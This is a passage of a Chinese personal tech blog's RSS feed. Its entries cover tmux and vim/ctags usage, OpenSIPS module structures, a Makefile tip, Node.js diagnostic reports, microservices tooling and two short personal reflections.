&lt;li&gt;编辑器呢。锻炼自己的VIM使用能力吧。VIM是个外边比较冰冷的编辑器，上手难度相比于那些花花绿绿的编辑器而言，显得那么格格不入。但是就像有首歌唱的的，有些人不知道那些好，但就是谁也替代不了。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总之呢，你必须要强迫自己能够熟练的运用以下的几个软件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;VIM&lt;/li&gt;
&lt;li&gt;tumx&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;后记&#34;&gt;后记&lt;/h1&gt;</description>
    </item>
    <item>
      <title>岁月的皮肤</title>
      <link>https://wdd.js.org/posts/2020/08/cs9htr/</link>
      <pubDate>Sun, 30 Aug 2020 21:47:35 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/08/cs9htr/</guid>
      <description>&lt;p&gt;早上六点多起床，搭乘半个小时的地铁，来到医院做体验。&lt;/p&gt;
&lt;p&gt;在抽血排队叫号的时候，我看到一位老奶奶被她女儿搀扶着坐在抽血的窗口前。&lt;/p&gt;
&lt;p&gt;老奶奶把右边的胳膊伸到抽血的垫子上，那是让人看一眼就难以忘记的皮肤。她的皮肤非常松弛，布满了褶皱，褶皱上有各种棕色和深色的斑点。&lt;/p&gt;
&lt;p&gt;我回想起了高中时学的生物学，皮肤是人类最大的一个器官，并且是保护人体的第一道防线。&lt;/p&gt;
&lt;p&gt;我不禁看了看自己胳膊，思绪万千。或许以后我的皮肤也是这样吧。这就是岁月的皮肤！&lt;/p&gt;
&lt;p&gt;时间啊！你走的慢点吧！&lt;/p&gt;
&lt;p&gt;人生很短，做些值得回忆的事情吧。&lt;/p&gt;</description>
    </item>
    <item>
      <title>从日漫到美漫</title>
      <link>https://wdd.js.org/posts/2020/08/ybgr0g/</link>
      <pubDate>Sun, 30 Aug 2020 21:22:46 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/08/ybgr0g/</guid>
      <description>&lt;p&gt;我挺喜欢看动漫的，尤其是日漫(似乎也没有别的选择🐶)。&lt;/p&gt;
&lt;p&gt;小时候星空卫视放七龙珠，大学追火影和海贼王。日漫中梦想和激战总是少不了，这也是少年所必不可少的。但是日漫有个很大的特点，就是烂尾。&lt;/p&gt;
&lt;p&gt;没办法，漫画一旦达到了一定的连载时期，很多时候往往不受原作者控制了。这其中可能涉及到不少人的利益纠葛。&lt;/p&gt;
&lt;p&gt;与动辄几百集的日漫相比，美漫似乎更加偏向于短小精悍。&lt;/p&gt;
&lt;p&gt;近年来我也看过一些不错的美漫。例如瑞克和莫提，脆莓公园。这类漫画有个特点，就是更加现实，当然其中也不乏有温情出现。看这类漫画，让我想到李宗吾先生所说的厚黑学。感觉美国人是无师自通，深谙厚黑之哲学。&lt;/p&gt;
&lt;p&gt;也许动漫没有变，变的是我们自己：从梦想和激战转变到现实和厚黑。&lt;/p&gt;</description>
    </item>
    <item>
      <title>概念理解 module_exports</title>
      <link>https://wdd.js.org/opensips/module-dev/l5/</link>
      <pubDate>Sat, 22 Aug 2020 12:45:42 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/module-dev/l5/</guid>
      <description>&lt;h1 id=&#34;module_exports&#34;&gt;module_exports&lt;/h1&gt;
&lt;p&gt;这个结构在每个模块中都有，这个有点类似js的export或者说是node.js的module.export。&lt;/p&gt;
&lt;p&gt;这是一个接口的规范。&lt;/p&gt;
&lt;p&gt;重要讲解几个关键点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;local_zone_code是模块名字，这个是必需的&lt;/li&gt;
&lt;li&gt;cmds表示在opensips脚本里可以有那些暴露的函数&lt;/li&gt;
&lt;li&gt;params规定了模块的参数&lt;/li&gt;
&lt;li&gt;mod_init在模块初始化的时候会被调用, 只会被调用一次&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于module_exports这个结构的定义，可以查阅：sr_module.h文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;struct module_exports exports&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local_zone_code&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    MOD_TYPE_DEFAULT,/* class of this module */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    MODULE_VERSION,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DEFAULT_DLFLAGS, /* dlopen flags */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    0,               /* load &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    NULL,            /* OpenSIPS module dependencies */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    cmds,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    params,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    0,          /* exported statistics */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    0,          /* exported MI functions */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    0,          /* exported pseudo-variables */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    0,          /* exported transformations */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    0,          /* extra processes */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    0,          /* pre-init &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    mod_init,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;response_function&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;destroy_function&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  /* per-child init &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;cmds&#34;&gt;cmds&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;struct cmd_export_ &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    char* name;             /* opensips脚本里的函数名 */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    cmd_function &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;;  /* 关联的C代码里的函数 */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    int param_no;           /* 参数的个数 */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fixup_function fixup;   /* 修正参数 */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    free_fixup_function free_fixup; /* 修正参数的 */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    int flags;              /* 函数flag，主要是用来标记函数可以在哪些路由中使用 */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;cmd_function&lt;/p&gt;</description>
    </item>
    <item>
      <title>统一入口Makefile</title>
      <link>https://wdd.js.org/posts/2020/08/rudtng/</link>
      <pubDate>Sat, 22 Aug 2020 11:41:32 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/08/rudtng/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---src
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   |___Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   |___main.c
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如何编写顶层的Makefiel, 使其进入到src中，执行src中的Makefile?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;run:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;MAKE&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; -C src target a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; b&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>tmux深度教学</title>
      <link>https://wdd.js.org/posts/2020/08/osz3gu/</link>
      <pubDate>Sat, 22 Aug 2020 08:00:03 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/08/osz3gu/</guid>
      <description>&lt;h1 id=&#34;tmux使用场景&#34;&gt;tmux使用场景&lt;/h1&gt;
&lt;p&gt;远程ssh连接到服务器，最难受的是随时有可能ssh掉线，然后一切都需要花额外的时间重新恢复，也有可能一些工作只能重新开始。&lt;/p&gt;
&lt;p&gt;在接续介绍tmux之前，先说说mosh。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/08/osz3gu/2022-10-29-20-22-54.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;【mosh架构图】&lt;/p&gt;
&lt;p&gt;我曾使用过&lt;a href=&#34;https://mosh.org/&#34;&gt;mosh&lt;/a&gt;, 据说mosh永远不会掉线。实际上有可能的确如此，但是mosh实际上安装比较麻烦。mosh需要在服务端安装server, 然后要在你本地的电脑上安装client, 然后通过这个client去连接mosh服务端的守护进程。mosh需要安装在客户端服务端都安装软件，然后可能还要设置一下网络策略，才能真正使用。&lt;/p&gt;
&lt;p&gt;mosh需要改变很多，这在生产环境是不可能的。另外即使是自己的开发环境，这样搞起来也是比较麻烦的。&lt;/p&gt;
&lt;p&gt;下图是tmux的架构图。实际上我们只需要在服务端安装tmux, 剩下的ssh的连接都可以用标准的功能。&lt;!-- raw HTML omitted --&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/08/osz3gu/2022-10-29-20-23-08.png&#34;&gt;
&lt;!-- raw HTML omitted --&gt;【tmux架构图】&lt;/p&gt;
&lt;h1 id=&#34;tmux概念sesssion-window-panes&#34;&gt;tmux概念：sesssion, window, panes&lt;/h1&gt;
&lt;p&gt;概念不清楚，往往是觉得tmux难用的关键点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;session之间是相互隔离的，tmux可以启动多个session&lt;/li&gt;
&lt;li&gt;一个session可以有多个window&lt;/li&gt;
&lt;li&gt;一个window可以有多个panes&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/08/osz3gu/2022-10-29-20-23-27.png&#34;&gt;
&lt;!-- raw HTML omitted --&gt;在tmux中按ctrl-b w, 可以在sesion，window和panel之间跳转。&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/08/osz3gu/2022-10-29-20-23-38.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意：默认情况下，&lt;strong&gt;一个sesion默认会打开一个window, 一个window会默认打开一个pane。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;session操作&#34;&gt;session操作&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;创建新的sesssion: &lt;code&gt;tmux new -s some_name&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;脱离session: &lt;code&gt;ctrl-b +d&lt;/code&gt;  注意即使脱离session， session中的内容还是在继续工作的&lt;/li&gt;
&lt;li&gt;进入某个session: &lt;code&gt;tmux attach -t some_name&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;查看sesion列表: &lt;code&gt;tmux ls&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;kill某个session: &lt;code&gt;tmux kill-session -t some_name&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;kill所有session: &lt;code&gt;tmux kill-server&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;重命名session: &lt;code&gt;ctrl-b $&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;选择session: &lt;code&gt;ctrl-b s&lt;/code&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;window操作&#34;&gt;window操作&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;新建: &lt;code&gt;ctrl-b c&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;查看列表: &lt;code&gt;ctrl-b w&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;关闭当前window: &lt;code&gt;ctrl-b &amp;amp;&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;重命名当前window: &lt;code&gt;ctrl-b ,&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;切换到上一个window: &lt;code&gt;ctrl-b p&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;切换到下一个window: &lt;code&gt;ctrl-b n&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;按序号切换到制定的window: &lt;code&gt;ctrl-b 数字&lt;/code&gt;  数字可以用0-9&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;panes操作&#34;&gt;panes操作&lt;/h1&gt;
&lt;p&gt;pane相当于分屏，所有pane都是在一个窗口里都显示出来的。这点和window不同，一个window显示出来，则意味着其他window是隐藏的。&lt;/p&gt;</description>
    </item>
    <item>
      <title>打造高可扩展性的微服务</title>
      <link>https://wdd.js.org/posts/2020/08/lrzu06/</link>
      <pubDate>Sat, 15 Aug 2020 21:14:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/08/lrzu06/</guid>
      <description>&lt;h1 id=&#34;关键技术&#34;&gt;关键技术&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Docker: 容器&lt;/li&gt;
&lt;li&gt;kuberneter：架构与部署&lt;/li&gt;
&lt;li&gt;HELM: 打包和部署&lt;/li&gt;
&lt;li&gt;Prometheus： 监控&lt;/li&gt;
&lt;li&gt;Open TRACING + ZIPKIN ： 分布式追踪&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;关键性能指标&#34;&gt;关键性能指标&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;I/O 性能:&lt;/li&gt;
&lt;li&gt;启动耗时: 当服务出现故障，需要重启时，启动的速度越快，对客户的影响越小。&lt;/li&gt;
&lt;li&gt;内存使用:&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;</description>
    </item>
    <item>
      <title>Nodejs诊断报告</title>
      <link>https://wdd.js.org/fe/nodejs-report/</link>
      <pubDate>Thu, 13 Aug 2020 11:25:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/nodejs-report/</guid>
      <description>&lt;p&gt;在v11.7.0中加入实验性功能，诊断报告。诊断报告的输出是一个json文件，包括以下信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;进程信息&lt;/li&gt;
&lt;li&gt;操作系统信息&lt;/li&gt;
&lt;li&gt;堆栈信息&lt;/li&gt;
&lt;li&gt;内存资源使用&lt;/li&gt;
&lt;li&gt;libuv状态&lt;/li&gt;
&lt;li&gt;环境变量&lt;/li&gt;
&lt;li&gt;共享库&lt;/li&gt;
&lt;li&gt;诊断报告的原始信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;如何产生诊断报告&#34;&gt;如何产生诊断报告&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;必需使用 &amp;ndash;experimental-report 来启用&lt;/li&gt;
&lt;li&gt;process.report.writeReport() 来输出诊断报告&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;node --experimental-report --diagnostic-report-filename=YYYYMMDD.HHMMSS.PID.SEQUENCE#.txt --eval &amp;#34;process.report.writeReport(&amp;#39;report.json&amp;#39;)&amp;#34;

Writing Node.js report to file: report.json
Node.js report completed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用编辑器打开诊断报告，可以看到类似下面的内容。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/nodejs-report/2022-10-29-10-59-26.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;如何从诊断报告中分析问题&#34;&gt;如何从诊断报告中分析问题？&lt;/h1&gt;
&lt;p&gt;诊断报告很长，不太好理解。IBM开发了report-toolkit工具，可以用来分析。
要求：node &amp;gt; 11.8.0&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;npm install report-toolkit --global
或者
yarn global add report-toolkit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看帮助信息&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rtk --help
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;自动出发报告&#34;&gt;自动出发报告&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;node --experimental-report \
--diagnostic-report-on-fatalerror \
--diagnostic-report-uncaught-exception \
index.js
&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;$ node –help&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;grep report&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;--experimental-report&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;enable report generation&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;启用report功能&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;--diagnostic-report-on-fatalerror&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;generate diagnostic report on fatal (internal) errors&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;产生报告当发生致命错误&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;--diagnostic-report-on-signal&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;generate diagnostic report upon receiving signals&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;产生报告当收到信号&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;--diagnostic-report-signal=...&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;causes diagnostic report to be produced on provided signal. Unsupported in Windows. (default: SIGUSR2)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;--diagnostic-report-uncaught-exception&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;generate diagnostic report on uncaught exceptions&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;产生报告当出现未捕获的异常&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;--diagnostic-report-directory=...&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;define custom report pathname. (default: current working directory of Node.js process)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;--diagnostic-report-filename=...&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;define custom report file name. (default: YYYYMMDD.HHMMSS.PID.SEQUENCE#.txt)&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://nodejs.org/dist/latest-v12.x/docs/api/report.html&#34;&gt;https://nodejs.org/dist/latest-v12.x/docs/api/report.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://ibm.github.io/report-toolkit/quick-start&#34;&gt;https://ibm.github.io/report-toolkit/quick-start&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.ibm.com/technologies/node-js/articles/introducing-report-toolkit-for-nodejs-diagnostic-reports&#34;&gt;https://developer.ibm.com/technologies/node-js/articles/introducing-report-toolkit-for-nodejs-diagnostic-reports&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>vim ctags安装及使用</title>
      <link>https://wdd.js.org/posts/2020/08/ed6944/</link>
      <pubDate>Mon, 10 Aug 2020 09:29:24 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/08/ed6944/</guid>
      <description>&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ubuntu or debian&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install ctags
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# centos&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install ctags &lt;span style=&#34;color:#75715e&#34;&gt;# centos&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# macOSX&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;brew install ctags
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;注意，如果在macOS 上输入ctags -R, 可能会有报错
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/Library/Developer/CommandLineTools/usr/bin/ctags: illegal option -- R
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;usage: ctags &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-BFadtuwvx&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-f tagsfile&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; file ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;那么你可以输入which ctags: 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/ctags &lt;span style=&#34;color:#75715e&#34;&gt;# 如果输出是这个，那么路径就是错的。正确的目录应该是/usr/local/bin/ctags&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;那么你可以在你的.zshrc或者其他配置文件中，增加一个alias
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;alias ctags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/bin/ctags&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用&#34;&gt;使用&lt;/h1&gt;
&lt;p&gt;进入到项目跟目录&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ctags -R &lt;span style=&#34;color:#75715e&#34;&gt;# 当前目录及其子目录生成ctags文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;进入vim&#34;&gt;进入vim&lt;/h1&gt;
